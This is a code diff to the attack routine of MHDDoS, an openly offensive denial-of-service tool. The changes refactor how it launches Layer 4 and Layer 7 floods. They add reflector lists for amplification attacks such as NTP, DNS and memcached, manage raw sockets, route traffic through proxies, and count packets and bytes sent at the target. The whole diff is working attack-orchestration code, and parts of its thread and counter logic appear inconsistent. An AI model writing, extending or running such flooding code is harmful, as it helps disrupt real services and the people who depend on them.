@@ -1,3 +1,4 @@
+import logging
 import os
 from contextlib import suppress
 from json import load
@@ -10,9 +11,7 @@ from threading import Event, Thread
 from time import sleep, time, perf_counter
 from typing import List, Union
 
-import requests
-import validators
-from PyRoxy import Tools as ProxyTools, Proxy, ProxyType
+from PyRoxy import Tools as ProxyTools, ProxyType
 from icmplib import Host
 from requests import Response
 from yarl import URL
@@ -21,7 +20,7 @@ from MHDDoS.methods.layer_4 import Layer4
 from MHDDoS.methods.layer_7 import Layer7
 from MHDDoS.methods.methods import Methods
 from MHDDoS.methods.tools import Tools
-from MHDDoS.utils.config_files import read_configuration_file_lines
+from MHDDoS.utils.config_files import read_configuration_file_lines, read_configuration_file_text
 from MHDDoS.utils.console_utils import clear_lines_from_console
 from MHDDoS.utils.healthcheck_utils import TargetHealthCheckUtils
 from MHDDoS.utils.logs import craft_outreach_log_message
@@ -55,12 +54,14 @@ def attack(
     proxy_type: ProxyType = ProxyType.SOCKS5,
     proxies_file_path: str = "proxies/socks5.txt",
     user_agents_file_path: str = "user_agents.txt",
-    referrers_file_path: str = "referrers.txt"
+    referrers_file_path: str = "referrers.txt",
+    reflectors_file_path: str = None
 ):
     # LOAD CONFIG FILES
-    user_agents = read_configuration_file_lines(user_agents_file_path)
-    referrers = read_configuration_file_lines(referrers_file_path)
-    proxies = load_proxies(proxies_file_path, proxy_type)
+    user_agents = read_configuration_file_lines(user_agents_file_path) if user_agents_file_path is not None else []
+    referrers = read_configuration_file_lines(referrers_file_path) if referrers_file_path is not None else []
+    proxies = load_proxies(proxies_file_path, proxy_type) if proxies_file_path is not None else []
+    reflectors = None
 
     # SANITY CHECKS
     # check attack method
@@ -82,9 +83,9 @@ def attack(
         ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"
 
     # INITIALIZE COUNTERS
-    REQUESTS_SENT = Counter()
+    PACKETS_SENT = Counter()
     BYTES_SENT = Counter()
-    TOTAL_REQUESTS_SENT = Counter()
+    TOTAL_PACKETS_SENT = Counter()
     TOTAL_BYTES_SENT = Counter()
 
     if attack_method in Methods.LAYER7_METHODS:
@@ -136,57 +137,42 @@ def attack(
         # if port > 65535 or port < 1:
         #     exit("Invalid Port [Min: 1 / Max: 65535] ")
 
-        RAW_SOCKET_METHODS = {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"}
-        if attack_method in RAW_SOCKET_METHODS \
-                and not Tools.checkRawSocket():
-            exit("Cannot Create Raw Socket")
+        # RAW SOCKET SUPPORT
+        if attack_method in Methods.WHICH_REQUIRE_RAW_SOCKETS and not Tools.checkRawSocket():
+            exit(f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")
 
-        threads = int(argv[3])
-        timer = int(argv[4])
-        proxies = None
-        referrers = None
-        if not port:
-            logger.warning("Port Not Selected, Set To Default: 80")
-            port = 80
+        # threads = int(argv[3])
+        # timer = int(argv[4])
+        # proxies = None
+        # referrers = None
+        # if not port:
+        #     logger.warning("Port Not Selected, Set To Default: 80")
+        #     port = 80
 
-        if len(argv) >= 6:
-            argfive = argv[5].strip()
-            if argfive:
-                referrers_file_path = Path(__dir__ / "files" / argfive)
-                if attack_method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
-                    if not referrers_file_path.exists():
-                        exit("The reflector file doesn't exist")
-                    if len(argv) == 7:
-                        logger.setLevel("DEBUG")
-                        referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
-                    if not referrers:
-                        exit("Empty Reflector File ")
+        # REFLECTORS
+        if reflectors_file_path is not None and attack_method in Methods.WHICH_SUPPORT_REFLECTORS:
+            if not reflectors_file_path:
+                exit(f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")
 
-                elif argfive.isdigit() and len(argv) >= 7:
-                    if len(argv) == 8:
-                        logger.setLevel("DEBUG")
-                    proxy_type = int(argfive)
-                    proxy_path_relative = argv[6].strip()
-                    proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
-                    if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
-                        proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
-                    proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
-                    proxies = ProxyManager.validateProxyList(proxies, ip, port, attack_method, target_address)
-                    if attack_method not in {"MINECRAFT", "MCBOT", "TCP"}:
-                        exit("this attack_method cannot use for layer4 proxy")
+            reflectors_text = read_configuration_file_text(reflectors_file_path)
+            if reflectors_text is None:
+                exit(f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
 
-                else:
-                    logger.setLevel("DEBUG")
+            reflectors = set(a.strip() for a in ProxyTools.Patterns.IP.findall(reflectors_text))
+            if not reflectors:
+                exit(f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")
+
+        # PROXIES WARNING
+        if proxies is not None and len(proxies) > 0:
+            if attack_method not in Methods.WHICH_SUPPORT_PROXIES:
+                logger.warning(f"{attack_method} attack method does not support proxies. {attack_method} attack connections will happen from your IP.")
 
         # TODO: manage threads actively
-        for _ in range(threads):
-            Layer4((host, port), referrers, attack_method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
+        # for _ in range(threads):
+        #     Layer4((host, port), referrers, attack_method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
     
     # TODO: input parameters
     # TODO: launch a lot of threads according to the given methods
-    logger.info(f"Attack started at {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
-    event.set()
-    ts = time()
 
     # PREPARE FOR THREAD MANAGEMENT
     thread_stop_events: List[Event] = []
@@ -197,22 +183,29 @@ def attack(
         thread_stop_events.append(stop_event)
 
         # TODO: select random attack method from the list (when there will be multiple)
-        if attack_method in Methods.LAYER7_METHODS:
-            Layer7(target.url, target.ip, attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, proxies, BYTES_SENT, REQUESTS_SENT).start()
-        elif attack_method in Methods.LAYER4_METHODS:
-            Layer4((target.ip, port), referrers, attack_method, stop_event, proxies, BYTES_SENT, REQUESTS_SENT).start()
+        selected_attack_method = attack_method
+
+        if selected_attack_method in Methods.LAYER7_METHODS:
+            Layer7(target.url, target.ip, selected_attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, proxies, BYTES_SENT, PACKETS_SENT).start()
+        elif selected_attack_method in Methods.LAYER4_METHODS:
+            print("Start layer 4", flush=True)
+            selected_proxies = proxies if selected_attack_method in Methods.WHICH_SUPPORT_PROXIES else None
+            Layer4((target.ip, target.port), reflectors, selected_attack_method, stop_event, selected_proxies, BYTES_SENT, PACKETS_SENT).start()
+
+        stop_event.set()
 
     def stop_attack_thread():
         if len(thread_stop_events) == 0:
             return
 
-        thread_to_stop = thread_stop_events.pop()
         thread_to_stop_event = thread_stop_events.pop()
-        thread_to_stop_event.set()
+        thread_to_stop_event.clear()
 
-    INITIAL_THREADS_COUNT = 1000
+    INITIAL_THREADS_COUNT = 1
     STEP = 100
 
+    # ATTACK
+    logger.info(f"Starting attack at {target.ip}:{target.port} using {attack_method} attack method.")
     for _ in range(INITIAL_THREADS_COUNT):
         start_new_attack_thread()
 
@@ -222,20 +215,31 @@ def attack(
         #       - decrease/increase threads
         #       - push attack status into the queue
 
-        # update request counts
-        TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
-        TOTAL_BYTES_SENT += int(BYTES_SENT)
-        REQUESTS_SENT.set(0)
-        BYTES_SENT.set(0)
-
-        # craft the status log message
-        pps = Tools.humanformat(int(REQUESTS_SENT))
-        bps = Tools.humanbytes(int(BYTES_SENT))
-        tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
-        tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
+        # update counters
+        pps, tp, bps, tb = update_counters(PACKETS_SENT, TOTAL_PACKETS_SENT, BYTES_SENT, TOTAL_BYTES_SENT)
         logger.info(f"Total bytes sent: {tb}, total requests: {tp}, BPS: {bps}, PPS: {pps}")
 
         sleep(1)
+        stop_attack_thread()
+
+
+def update_counters(rolling_packets_counter: Counter,
+                    total_packets_counter: Counter,
+                    rolling_bytes_counter: Counter,
+                    total_bytes_counter: Counter) -> (str, str, str, str):
+    # update total request counts
+    total_packets_counter += int(rolling_packets_counter)
+    rolling_packets_counter.set(0)
+    total_bytes_counter += int(rolling_bytes_counter)
+    rolling_bytes_counter.set(0)
+
+    # return current stats
+    pps = Tools.humanformat(int(rolling_packets_counter))
+    bps = Tools.humanbytes(int(rolling_bytes_counter))
+    tp = Tools.humanformat(int(total_packets_counter))
+    tb = Tools.humanbytes(int(total_bytes_counter))
+
+    return pps, tp, bps, tb
 
 
 def start():
